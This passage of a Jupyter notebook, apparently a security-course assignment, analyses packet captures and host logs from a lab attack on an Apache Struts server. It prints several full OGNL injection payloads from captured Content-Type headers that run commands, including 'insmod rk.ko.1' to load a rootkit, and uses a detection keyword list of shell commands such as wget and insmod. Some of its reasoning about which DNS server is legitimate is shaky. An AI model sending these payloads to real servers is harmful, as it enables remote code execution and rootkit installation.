      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n",
      "587 insmod 172.17.0.2 172.17.0.1 \n",
      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n",
      "597 insmod 172.17.0.2 172.17.0.1 \n",
      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Subtask 2: Content-type containing Command names\n",
    "cmd_name = ['whoami','wget',\"'ls'\",'cat','cd','insmod','ssh','lsmod']\n",
    "from datetime import date\n",
    "for i, pkt in enumerate(http):\n",
    "    try:\n",
    "        if pkt.http.request_uri == '/showcase.action':\n",
    "            for cmd in cmd_name:\n",
    "                if cmd in pkt.http.Content_type:\n",
    "                    print(i,cmd, pkt.ip.dst, pkt.ip.src,'\\n',pkt.http.Content_type,'\\n')\n",
    "    except:\n",
    "        pass;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "Mu3WpU3lQ90s",
    "outputId": "23cee45c-ae2f-42a7-9591-3832a7e79f9a"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>content length</th>\n",
       "      <th>packet length</th>\n",
       "      <th>content-type</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>index</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>407</th>\n",
       "      <td>144</td>\n",
       "      <td>358</td>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>423</th>\n",
       "      <td>144</td>\n",
       "      <td>358</td>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>439</th>\n",
       "      <td>144</td>\n",
       "      <td>358</td>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>519</th>\n",
       "      <td>806</td>\n",
       "      <td>1020</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529</th>\n",
       "      <td>810</td>\n",
       "      <td>1024</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>539</th>\n",
       "      <td>845</td>\n",
       "      <td>1059</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>551</th>\n",
       "      <td>845</td>\n",
       "      <td>1059</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>577</th>\n",
       "      <td>818</td>\n",
       "      <td>1032</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>587</th>\n",
       "      <td>818</td>\n",
       "      <td>1032</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>597</th>\n",
       "      <td>818</td>\n",
       "      <td>1032</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       content length packet length  \\\n",
       "index                                 \n",
       "407               144           358   \n",
       "423               144           358   \n",
       "439               144           358   \n",
       "519               806          1020   \n",
       "529               810          1024   \n",
       "539               845          1059   \n",
       "551               845          1059   \n",
       "577               818          1032   \n",
       "587               818          1032   \n",
       "597               818          1032   \n",
       "\n",
       "                                            content-type  \n",
       "index                                                     \n",
       "407    .multipart/form-data~${#context[\"com.opensymph...  \n",
       "423    .multipart/form-data~${#context[\"com.opensymph...  \n",
       "439    .multipart/form-data~${#context[\"com.opensymph...  \n",
       "519    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  \n",
       "529    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  \n",
       "539    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  \n",
       "551    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  \n",
       "577    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  \n",
       "587    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  \n",
       "597    %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...  "
      ]
     },
     "execution_count": 22,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Subtask 2.a: Data frame of Content\n",
    "index, content, content_length, packet_length = [], [], [], []\n",
    "for i, pkt in enumerate(http):\n",
    "    try:\n",
    "        if pkt.http.request_uri == '/showcase.action':\n",
    "            # '172.17.0.2' is the vulnerable server's IP address\n",
    "            if '172.17.0.2' in pkt.ip.dst:\n",
    "                content.append(pkt.http.Content_type)\n",
    "                content_length.append(len(pkt.http.Content_type))\n",
    "                packet_length.append(pkt.length)\n",
    "                index.append(i)\n",
    "    except:\n",
    "        pass;\n",
    "df_content = pd.DataFrame({'index': index,\n",
    "                           'content length': content_length,\n",
    "                           'packet length': packet_length,\n",
    "                           'content-type':content})\n",
    "df_content.set_index('index')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "8BkuS0sWQ90u",
    "outputId": "37a0a949-a1fe-499f-f7d9-e3e9c85c04c6"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Command Name</th>\n",
       "      <th>Present in the attack</th>\n",
       "      <th>Interpretation</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>whoami</td>\n",
       "      <td>Yes</td>\n",
       "      <td>Displays the name of the current user</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>wget</td>\n",
       "      <td>Yes</td>\n",
       "      <td>Retrieve content from web servers</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ls</td>\n",
       "      <td>Yes</td>\n",
       "      <td>List the files and directories within the file...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>cat</td>\n",
       "      <td>No</td>\n",
       "      <td>-</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>cd</td>\n",
       "      <td>No</td>\n",
       "      <td>-</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>insmod</td>\n",
       "      <td>Yes</td>\n",
       "      <td>Insert specified modules into the kernel</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>ssh</td>\n",
       "      <td>No</td>\n",
       "      <td>-</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>lsmod</td>\n",
       "      <td>No</td>\n",
       "      <td>-</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  Command Name Present in the attack  \\\n",
       "0       whoami                   Yes   \n",
       "1         wget                   Yes   \n",
       "2           ls                   Yes   \n",
       "3          cat                    No   \n",
       "4           cd                    No   \n",
       "5       insmod                   Yes   \n",
       "6          ssh                    No   \n",
       "7        lsmod                    No   \n",
       "\n",
       "                                      Interpretation  \n",
       "0              Displays the name of the current user  \n",
       "1                  Retrieve content from web servers  \n",
       "2  List the files and directories within the file...  \n",
       "3                                                  -  \n",
       "4                                                  -  \n",
       "5           Insert specified modules into the kernel  \n",
       "6                                                  -  \n",
       "7                                                  -  "
      ]
     },
     "execution_count": 23,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Subtask 2.b Fill the table\n",
    "df_table = pd.DataFrame({'Command Name': ['whoami','wget','ls','cat','cd','insmod','ssh','lsmod'],\n",
    "                         'Present in the attack': ['Yes','Yes','Yes','No','No','Yes','No','No'],\n",
    "                         'Interpretation': ['Displays the name of the current user',\n",
    "                                           'Retrieve content from web servers',\n",
    "                                           'List the files and directories within the file system',\n",
    "                                            '-',\n",
    "                                            '-',\n",
    "                                            'Insert specified modules into the kernel',\n",
    "                                            '-',\n",
    "                                            '-']})\n",
    "df_table"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "a1zUVGBRQ90x"
   },
   "source": [
    "## Host Logs Analysis (Attack Stages 3-5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "wrD1L7orQ90x"
   },
   "source": [
    "### Analyzing kernel-related activities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "OklekKYvQ90x",
    "outputId": "01a05a51-9c71-42db-836c-2a064b8e4ea2"
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['rk', 'ipt_MASQUERADE', 'nf_nat_masquerade_ipv4',\n",
       "       'nf_conntrack_netlink', 'nfnetlink', 'xfrm_user', 'xfrm_algo',\n",
       "       'iptable_nat', 'nf_conntrack_ipv4', 'nf_defrag_ipv4',\n",
       "       'nf_nat_ipv4', 'xt_addrtype', 'iptable_filter', 'ip_tables',\n",
       "       'xt_conntrack', 'x_tables', 'nf_nat', 'nf_conntrack',\n",
       "       'br_netfilter', 'bridge', 'stp', 'llc', 'overlay', 'ppdev',\n",
       "       'intel_powerclamp', 'crct10dif_pclmul', 'crc32_pclmul',\n",
       "       'ghash_clmulni_intel', 'aesni_intel', 'aes_x86_64', 'lrw',\n",
       "       'vboxvideo', 'gf128mul', 'glue_helper', 'ablk_helper', 'cryptd',\n",
       "       'ttm', 'drm_kms_helper', 'snd_intel8x0', 'snd_ac97_codec',\n",
       "       'ac97_bus', 'input_leds', 'joydev', 'serio_raw', 'snd_pcm', 'drm',\n",
       "       'fb_sys_fops', 'snd_timer', 'syscopyarea', 'sysfillrect',\n",
       "       'i2c_piix4', 'snd', 'sysimgblt', 'soundcore', 'vboxguest',\n",
       "       '8250_fintek', 'parport_pc', 'parport', 'mac_hid', 'autofs4',\n",
       "       'hid_generic', 'usbhid', 'hid', 'psmouse', 'ahci', 'libahci',\n",
       "       'e1000', 'pata_acpi', 'fjes', 'video', 'xt_nat', 'xt_tcpudp',\n",
       "       'veth', 'floppy', 'xor', 'raid6_pq', 'ufs', 'qnx4', 'hfsplus',\n",
       "       'hfs', 'minix', 'ntfs', 'msdos', 'jfs', 'xfs', 'libcrc32c',\n",
       "       'btrfs', 'nfnetlink_queue', 'nfnetlink_log', 'bluetooth'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 24,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 1.1 List of Kernel Modules\n",
    "log_kernel_df = log_df.loc[log_df['name'] == 'kernel_module']\n",
    "log_kernel_df['columns.name'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "5lO-TPLwQ902",
    "outputId": "7c10ab5d-0513-4571-fc01-4b383da02cde"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>columns.name</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.username</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>rk</td>\n",
       "      <td>added</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43</th>\n",
       "      <td>ipt_MASQUERADE</td>\n",
       "      <td>added</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>44</th>\n",
       "      <td>nf_nat_masquerade_ipv4</td>\n",
       "      <td>added</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45</th>\n",
       "      <td>nf_conntrack_netlink</td>\n",
       "      <td>added</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>nfnetlink</td>\n",
       "      <td>added</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              columns.name action decorations.username\n",
       "42                      rk  added                  NaN\n",
       "43          ipt_MASQUERADE  added                  NaN\n",
       "44  nf_nat_masquerade_ipv4  added                  NaN\n",
       "45    nf_conntrack_netlink  added                  NaN\n",
       "46               nfnetlink  added                  NaN"
      ]
     },
     "execution_count": 25,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 1.2 Identify the attacker-controlled Kernel module\n",
    "log_kernel_df[['columns.name','action','decorations.username']].head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "5pTSyZWuQ905",
    "outputId": "9bff537b-5b86-42fb-87d0-52600d8f0ac2"
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'rk'}"
      ]
     },
     "execution_count": 26,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "attacker_controlled_km = []\n",
    "for km in log_kernel_df['columns.name'].unique():\n",
    "    for content in df_content.loc[:,'content-type']:\n",
    "        if km in content:\n",
    "            attacker_controlled_km.append(km)\n",
    "set(attacker_controlled_km)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "qnG5eVy5Q908"
   },
   "source": [
    "1.3\n",
    "- Only rk kernel module is being controlled by attacker using wget command.\n",
    "- There is *rk.ko* in *wget* in the *http.Content_type* when *http.request_uri* is '/showcase.action'. Again attacker used *insmod* command to load the module on the server since *rk.ko.1* is present in it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "v-tmHLluQ908"
   },
   "source": [
    "### Internal Hostnames files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "gcxH2YnYQ909",
    "outputId": "2a143578-0375-4473-b4bd-ce99a48347aa"
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx',\n",
       " '\\\\/root\\\\/.ssh\\\\/4913',\n",
       " '\\\\/root\\\\/.ssh\\\\/id_rsa',\n",
       " '\\\\/root\\\\/.ssh\\\\/id_rsa.pub',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts~'}"
      ]
     },
     "execution_count": 27,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = []\n",
    "for i in range(len(log_df)):\n",
    "    if '.ssh' in str(log_df.loc[i,'columns.target_path']):\n",
    "        file_path.append(log_df.loc[i,'columns.target_path'])\n",
    "set(file_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "collapsed": true,
    "id": "Kcc89iqVQ90_"
   },
   "source": [
    "**\\/root\\/.ssh\\/known_hosts** is the file that contain internal hostnames"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "nr32kB2OQ91A"
   },
   "source": [
    "### Evidence to extract the list of internal hostnames via HTTP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "rG4ESmEyQ91A",
    "outputId": "afc80bc7-16d3-42d4-e1fb-bd5c63eab1d4"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No evidence of 'known_hosts' file being accessed\n"
     ]
    }
   ],
   "source": [
    "# To check if known_hosts is being accessed by attacker\n",
    "count = 0\n",
    "for content in df_content['content-type']:\n",
    "    if 'known_hosts' in content:\n",
    "        count += 1\n",
    "if count>0:\n",
    "    print(\"'known_hosts' is accessed by attacker\")\n",
    "else:\n",
    "    print(\"No evidence of 'known_hosts' file being accessed\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "F97JT4fU0pVF"
   },
   "source": [
    "It may be due to- attacker did not download or was a well learned attacker and hence did not extract using http."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "rerCWD4mQ91C"
   },
   "source": [
    "## DNS Traffic Analysis (Attack Stages 6-7)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "8Jm5UB370pVF"
   },
   "source": [
    "### DNS servers: Attacker controlled and legitimate DNS server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "V23qVDKLQ91D",
    "outputId": "7dba5cea-8ab5-42da-c5b7-fb28fa2d42ec"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>length</th>\n",
       "      <th>highest layer</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th rowspan=\"16\" valign=\"top\">10.0.2.15</th>\n",
       "      <th>35552</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>36048</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>42076</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43204</th>\n",
       "      <td>8</td>\n",
       "      <td>8</td>\n",
       "      <td>8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43790</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43917</th>\n",
       "      <td>1110</td>\n",
       "      <td>1110</td>\n",
       "      <td>1110</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45204</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46118</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46538</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>47111</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>51949</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>53523</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>54157</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>57996</th>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>58999</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>60816</th>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>162.212.156.148</th>\n",
       "      <th>53</th>\n",
       "      <td>1120</td>\n",
       "      <td>1120</td>\n",
       "      <td>1120</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75.75.75.75</th>\n",
       "      <th>53</th>\n",
       "      <td>21</td>\n",
       "      <td>21</td>\n",
       "      <td>21</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                           timestamp  length  highest layer\n",
       "dest_ip         dest_port                                  \n",
       "10.0.2.15       35552              2       2              2\n",
       "                36048              1       1              1\n",
       "                42076              2       2              2\n",
       "                43204              8       8              8\n",
       "                43790              2       2              2\n",
       "                43917           1110    1110           1110\n",
       "                45204              1       1              1\n",
       "                46118              2       2              2\n",
       "                46538              2       2              2\n",
       "                47111              1       1              1\n",
       "                51949              1       1              1\n",
       "                53523              1       1              1\n",
       "                54157              2       2              2\n",
       "                57996              2       2              2\n",
       "                58999              1       1              1\n",
       "                60816              1       1              1\n",
       "162.212.156.148 53              1120    1120           1120\n",
       "75.75.75.75     53                21      21             21"
      ]
     },
     "execution_count": 29,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df.groupby(['dest_ip', 'dest_port']).count()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "CBblmjfD0pVH",
    "outputId": "2a8dd996-55d6-4e76-c667-803a614e7081"
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'162.212.156.148'"
      ]
     },
     "execution_count": 30,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Checking if destination IP address of DNS server in HTTP Content of vulnerable server\n",
    "for content in df_content['content-type']:\n",
    "    for ip in dns_df['dest_ip'].unique():\n",
    "        if ip in content:\n",
    "            attacker_controlled_ip = ip\n",
    "            break\n",
    "            \n",
    "attacker_controlled_ip"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "2KadyEgq0pVJ"
   },
   "source": [
    "Attacker controlled server: 162.212.156.148\n",
    "\n",
    "Since attacker controlled server has port 53 which is similar to server 75.75.75.75. This means 75.75.75.75 is not the legitimate DNS server since bad DNS server will not communicate with good DNS server. This means 10.0.2.15 is the legitimate server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "xis81pYGQ91I",
    "outputId": "5065acb8-7a3d-4246-8320-f51fae795677"
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light",
      "tags": []
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "attacker_controlled = dns_df[dns_df['dest_ip'] == '162.212.156.148']['length']\n",
    "legitimate_server = dns_df[dns_df['dest_ip'] == '10.0.2.15']['length']\n",
    "\n",
    "sns.kdeplot(attacker_controlled, color='r', Label='Attacker Controlled (162.212.156.148)') \n",
    "sns.kdeplot(legitimate_server, color='g', Label='Legitimate Server (10.0.2.15)')\n",
    "plt.xlabel('Length of DNS Queries');\n",
    "plt.ylabel('Probability Distribution');\n",
    "plt.title('Length of DNS server: Attacker controlled vs Legitimate server');"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "JyOi3q9W0pVL"
   },
   "source": [
    "### Plot a distribution of the length of DNS queries to the two DNS servers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 372
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 4719,
     "status": "ok",
     "timestamp": 1588205096854,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "3Pl0cEhL0pVM",
    "outputId": "81b3b58e-7961-43c2-95a8-cb4f08a44621"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pgmpy\n",
      "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/68/6b/661a65aa7788f3aff7228ba81625c540917d656f41e3eb031c6d60b0a25d/pgmpy-0.1.10-py3-none-any.whl (339kB)\n",
      "\r",
      "\u001b[K     |█                               | 10kB 20.7MB/s eta 0:00:01\r",
      "\u001b[K     |██                              | 20kB 1.8MB/s eta 0:00:01\r",
      "\u001b[K     |███                             | 30kB 2.4MB/s eta 0:00:01\r",
      "\u001b[K     |███▉                            | 40kB 1.7MB/s eta 0:00:01\r",
      "\u001b[K     |████▉                           | 51kB 2.1MB/s eta 0:00:01\r",
